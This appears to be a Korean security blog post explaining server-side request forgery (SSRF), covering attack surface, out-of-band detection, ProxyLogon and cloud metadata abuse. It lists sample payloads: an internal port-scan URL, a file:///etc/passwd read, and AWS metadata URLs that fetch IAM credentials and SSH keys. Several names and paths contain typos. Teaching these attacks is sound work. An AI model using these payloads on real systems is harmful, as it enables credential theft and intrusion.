---
layout: single
title: Servcer Side Requests Forgery (SSRF)
categories: Web-vuln
tag: [Servcer Side Requests Forgery, SSRF, web, web vulnerability, injection]
toc: true
author_profile: false
---

# SSRF 취약점이란?

> SSRF는 클라이언트측의 입력값을 위조시켜 위조된 HTTP 요청을 보내, 일반적으로 외부에서 접근이 불가능한 **<u style="color:red;">서버 내부망에 접근(Access)</u>** 하여, 데이터 유출 및 서버의 기밀성, 가용성, 무결성을 파괴한다. SSRF 의 경우 CSRF 공격과 유사하지만, 공격이 이루어지는 부분이 클라이언트측이냐 서버측이냐의 차이점이 존재한다. 

💡 **<u>SSRF 공격이 성공적으로 Exploit 될 경우 추가 공격으로 이루어지므로, 피해가 크다.</u>** 
{: .notice--primary} 

# 어떻게 발생하는가?
모든 클라이언트측의 요청에 응답을 한 서버에서 다루기에는 무리가 있다. 그러므로 각 서버끼리의 API를 통해 서버끼리 내부적으로 통신을 통해 요청과 응답이 이루어진다. 이때 접근 가능한 내부 IP를 통해 이루어지므로 SSRF 의 경우 루프백(Loopback) 주소인 127.0.0.1 을 사용하여 공격이 주로 이루어진다.

# 공격 표면
주로 URL을 통해 HTTP 요청과 응답에 URL에 관련된 정보가 있을 경우 SSRF 의 잠재적 공격 표면이 될 수 있으며, 특정 웹 사이트의 정보를 불러들어 오는 부분을 유심히 봐야한다.
하지만 외에도 다른 서비스로의 요청을 하는 기능에서도 많이 발견되고 있다.

> SSRF 의 취약점 판별은 OAST를 통한 out-of-band 기술을 통해 쉽게 파악할 수 있다. OAST를 통해 외부로의 접점을 확인할 수 있으며, 외부로의 통신이 막혀 있다면, loaclhost, 사설 IP등을 호출하여 접근 가능 여부를 파악할 수 있다.

특히나 SSRF 공격의 경우, DMZ 뒤쪽에서 동작하기에, ACL 등 보안정책을 우회할 수 있다.
<u sytle="color:red;">보통 SSRF의 경우 서버단에서는 허용된 IP에 대해서만 화이트 리스트 기반을 통해서만 특정 서비스로의 요청이 실행된다.</u>

# 공격 유형
SSRF 를 활용한 공격 방식은 크게 3가지로 분류할 수 있다.
## Port Scan 및 내부 시스템 파일 탈취

<div class="notice">
    SSH 서비스 포트를 스캔할 시 file?=http//[IP]:22  구문 사용<br><br>

    [리눅스/유닉스]
<br>
    file?=http://file:///etc/passwd
<br>
    -- 허용하는 URL 스키마를 사용하여 접근 --
<br>
  <h4 style="color:red;">SSRF 의 경우 프로토콜에 대한 제한을 받지 않기때문에 FTP, SMTP, … 등 과 URI 스킴이 상용 가능하다.</h4>
</div>

## 2. Porxy Logon 기반 SSRF
2021년 CVE에 등록된 공개 취약점인 MS Exchange SSRF 를 활용
1. X-BEResoucrce 쿠키 변조를 통해 내부 서버 리소스 접근 가능

💡 **<u>X-BEResource는 Microsoft Exchange 서버에서 사용되는 특별한 HTTP 헤더이며, 이 헤더는 Exchange 서버의 원격 프로시저 호출(RPC) 기능에 대한 액세스를 관리하는데 사용된다.</u>** 
{: .notice--primary} 

2. /etc/proxyLogon.ecp 파일을 호출하여, 강제로 세션 연결이 가능한 proxyLogon을 이용해 별도의 인증 없이 공격자와 Exchange server와 HTTP연결 수행

> 해당 방법은 CVE-2021-26855 를 통해 자세하게 확인 가능하다.

## AWS 클라우드 기반 SSRF

💡 **<u>AWS 외에도 GCP, Azre, Digital Ocean등 public cloud를 사용하는 경우 Metadata API 로의 접근을 통해 instance에 대한 정보를 얻거나 중요한 키 값을 얻어 시스템을 탈취할 수 있다.u>** 
{: .notice--primary} 

<div class="notice">
  [AWS]<br>
# 169.254.169.254<br>
http://169.254.169.254/latest/user-data<br>
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]<br>
http://169.254.169.254/latest/meta-data/<br>
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]<br>
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance<br>
http://169.254.169.254/latest/meta-data/ami-id<br>
http://169.254.169.254/latest/meta-data/reservation-id<br>
http://169.254.169.254/latest/meta-data/hostname<br>
http://169.254.169.254/latest/meta-data/public-keys/<br>
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key<br>
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key<br>
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy<br>
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access<br>
http://169.254.169.254/latest/dynamic/instance-identity/document<br>
<br>
# instance-data<br>
http://instance-data/latest/meta-data<br>
http://instance-data/latest/meta-data/hostname<br>
http://instance-data/latest/meta-data/public-keys/
</div>

대표적으로 AWS의 Metadata API로의 접근 경로이다. 이 외에 다양한 API는 아래 링크에서 
확인이 가능하다.    
[참조 링크]: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Request Forgery#ssrf-url-for-cloud-instances